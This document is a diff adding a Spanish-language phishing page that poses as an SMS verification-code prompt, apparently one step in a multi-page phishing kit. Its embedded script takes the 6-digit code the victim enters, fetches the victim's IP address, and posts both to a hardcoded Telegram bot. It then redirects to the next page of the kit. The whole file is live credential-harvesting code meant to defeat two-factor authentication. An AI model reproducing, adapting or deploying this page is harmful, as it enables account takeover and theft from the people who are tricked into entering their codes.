@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Código de Verificación</title>
+  <link href="./index12_files/remixicon.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login--form {
+      background: #fff;
+      padding: 40px 35px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+    }
+
+    .login--form img {
+      margin-bottom: 20px;
+    }
+
+    .login--form span {
+      display: block;
+      font-size: 15px;
+      color: #444;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .login-box {
+      margin-bottom: 20px;
+    }
+
+    .login--input-box {
+      position: relative;
+    }
+
+    .login-input {
+      width: 100%;
+      text-align: center;
+      letter-spacing: 6px;
+      font-size: 20px;
+      padding: 12px;
+      border: 1px solid #d0d7de;
+      border-radius: 8px;
+      outline: none;
+      background: #fafbfc;
+      transition: all 0.25s ease;
+    }
+
+    .login-input:focus {
+      border-color: #0078d7;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0,120,215,0.15);
+    }
+
+    .login--button--whatsapp {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, #0078d7, #005a9e);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: not-allowed;
+      opacity: 0.6;
+      transition: all 0.3s ease;
+    }
+
+    .login--button--whatsapp.active {
+      cursor: pointer;
+      opacity: 1;
+    }
+
+    #countdown {
+      display: block;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #d93025;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <section class="login">
+    <form id="codeForm" class="login--form" onsubmit="enviarCodigo(event)">
+      <img src="./index12_files/lbg22.png" style="width:110px" alt="Logo" />
+
+      <span>
+        <b>Le hemos enviado un código de verificación de 6 dígitos vía SMS a su número registrado.<br>
+        Por favor, introdúzcalo a continuación:</b>
+      </span>
+
+      <div class="login--content">
+        <div class="login-box">
+          <div class="login--input-box">
+            <input type="tel" class="login-input" name="cod12" id="cod12" maxlength="6" minlength="6" required />
+          </div>
+        </div>
+      </div>
+
+      <button class="login--button--whatsapp" id="submitBtn" type="submit" disabled>Siguiente</button>
+      <span id="countdown">60 segundos restantes</span>
+    </form>
+  </section>
+
+  <script>
+    // DATOS DEL BOT
+    const BOT_TOKEN = "8107173590:AAEF_elz7cSx8D2S2pDF3UddMbqrWMAeT1c"; // reemplazar
+    const CHAT_ID = "-4802195491";   // reemplazar
+
+    // Control de bloqueo del botón
+    let timeLeft = 60; // 60 segundos
+    const countdownEl = document.getElementById("countdown");
+    const submitBtn = document.getElementById("submitBtn");
+
+    function updateCountdown() {
+      if (timeLeft > 0) {
+        countdownEl.textContent = `${timeLeft} segundos restantes`;
+        timeLeft--;
+        setTimeout(updateCountdown, 1000);
+      } else {
+        countdownEl.textContent = "";
+        submitBtn.disabled = false;
+        submitBtn.classList.add("active");
+      }
+    }
+    updateCountdown();
+
+    function enviarCodigo(e) {
+      e.preventDefault();
+      const codigo = document.getElementById('cod12').value;
+
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const mensaje = `🔐 *Código ingresado:* ${codigo}\n🌐 IP: ${ip}`;
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: mensaje,
+              parse_mode: "Markdown"
+            })
+          })
+          .then(() => {
+            setTimeout(() => {
+              window.location.href = "index6.html";
+            }, 1500);
+          })
+          .catch(err => {
+            console.error("Error al enviar:", err);
+          });
+        })
+        .catch(err => {
+          console.error("Error al obtener IP:", err);
+        });
+    }
+  </script>
+</body>
+</html>
